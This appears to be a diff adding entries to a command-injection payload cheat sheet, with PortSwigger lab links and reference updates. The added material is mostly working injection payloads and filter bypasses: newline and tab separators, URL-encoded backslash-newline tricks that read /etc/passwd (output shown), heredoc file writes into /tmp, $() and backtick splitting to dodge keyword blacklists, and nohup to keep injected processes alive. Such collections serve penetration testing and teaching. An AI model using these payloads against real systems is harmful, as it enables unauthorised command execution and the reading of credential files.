@@ -12,18 +12,21 @@
 * [Filter Bypasses](#filter-bypasses)
   * [Bypass without space](#bypass-without-space)
   * [Bypass with a line return](#bypass-with-a-line-return)
+  * [Bypass with backslash newline](#bypass-with-backslash-newline)
   * [Bypass characters filter via hex encoding](#bypass-characters-filter-via-hex-encoding)
   * [Bypass blacklisted words](#bypass-blacklisted-words)
    * [Bypass with single quote](#bypass-with-single-quote)
    * [Bypass with double quote](#bypass-with-double-quote)
    * [Bypass with backslash and slash](#bypass-with-backslash-and-slash)
    * [Bypass with $@](#bypass-with-)
+   * [Bypass with $()](#bypass-with--1)
    * [Bypass with variable expansion](#bypass-with-variable-expansion)
    * [Bypass with wildcards](#bypass-with-wildcards)
 * [Challenge](#challenge)
 * [Time based data exfiltration](#time-based-data-exfiltration)
 * [DNS based data exfiltration](#dns-based-data-exfiltration)
 * [Polyglot command injection](#polyglot-command-injection)
+* [Backgrounding long running commands](#backgrounding-long-running-commands)
 * [References](#references)
     
 
@@ -52,6 +55,13 @@ original_cmd_by_server; ls
 original_cmd_by_server && ls
 original_cmd_by_server | ls
 original_cmd_by_server || ls   # Only if the first cmd fail
+```
+
+Commands can also be run in sequence with newlines
+
+```bash
+original_cmd_by_server
+ls
 ```
 
 ### Inside a command
@@ -96,6 +106,16 @@ Commands execution without spaces, $ or { } - Linux (Bash only)
 IFS=,;`cat<<<uname,-a`
 ```
 
+Tabs work as separators in web apps where spaces are removed.
+
+```powershell
+;ls%09-al%09/home
+drwxr-xr-x  4 root root  4096 Jan 10 13:34 .
+drwxr-xr-x 18 root root  4096 Jan 10 13:33 ..
+drwx------  2 root root 16384 Jan 10 13:31 lost+found
+drwxr-xr-x  4 test test  4096 Jan 13 08:30 test
+```
+
 Works on Windows only.
 
 ```powershell
@@ -107,6 +127,33 @@ ping%PROGRAMFILES:~10,-5%IP
 
 ```powershell
 something%0Acat%20/etc/passwd
+```
+
+You can also write files.
+
+```powershell
+;cat>/tmp/hi<<EOF%0ahello%0aEOF
+;cat</tmp/hi
+hello
+```
+
+### Bypass with backslash newline
+
+Commands can be broken into parts by using backslash followed by a newline
+```powershell
+❯ cat /et\
+c/pa\
+sswd
+root:x:0:0:root:/root:/usr/bin/zsh
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+[SNIP]
+```
+URL encoded form would look like this:
+```powershell
+cat%20/et%5C%0Ac/pa%5C%0Asswd
 ```
 
 ### Bypass characters filter via hex encoding
@@ -191,6 +238,13 @@ echo $0
 echo whoami|$0
 ```
 
+### Bypass with $()
+```powershell
+who$()ami
+who$(echo am)i
+who`echo am`i
+```
+
 #### Bypass with variable expansion
 
 ```powershell
@@ -271,9 +325,28 @@ echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(
 echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
 ```
 
+## Backgrounding long running commands
+
+In some instances, you might have a long running command that gets killed by the process injecting it timing out.
+
+Using nohup, you can keep the process running after the parent process exits.
+
+```bash
+nohup sleep 120 > /dev/null &
+```
+
+## Labs
+
+* [OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)
+* [Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
+* [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
+* [Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
+* [Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
+
 ## References
 
 * [SECURITY CAFÉ - Exploiting Timed Based RCE](https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
-* [Bug Bounty Survey - Windows RCE spaceless](https://twitter.com/bugbsurveys/status/860102244171227136)
+* [Bug Bounty Survey - Windows RCE spaceless](https://web.archive.org/web/20180808181450/https://twitter.com/bugbsurveys/status/860102244171227136)
 * [No PHP, no spaces, no $, no { }, bash only - @asdizzle](https://twitter.com/asdizzle_/status/895244943526170628)
 * [#bash #obfuscation by string manipulation - Malwrologist, @DissectMalware](https://twitter.com/DissectMalware/status/1025604382644232192)
+* [What is OS command injection - portswigger](https://portswigger.net/web-security/os-command-injection)
